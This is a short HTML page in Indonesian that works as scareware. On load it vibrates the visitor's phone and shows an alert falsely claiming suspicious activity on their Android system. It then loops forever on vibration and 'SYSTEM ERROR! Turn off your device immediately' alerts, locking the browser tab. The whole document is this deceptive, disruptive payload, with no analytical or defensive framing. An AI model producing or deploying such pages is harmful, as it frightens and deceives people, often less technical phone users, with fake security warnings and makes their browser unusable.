<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sistem Error!</title>
</head>
<body>
    <script>
        function getarEkstrem() {
            if (navigator.vibrate) {
                navigator.vibrate(1000); 
            }
        }
        getarEkstrem();
        alert("PERINGATAN: Terdeteksi aktivitas mencurigakan pada sistem Android Anda!");
        while (true) {
            getarEkstrem();
            alert("SISTEM ERROR! Segera matikan perangkat Anda!");
        }
    </script>
</body>
</html>
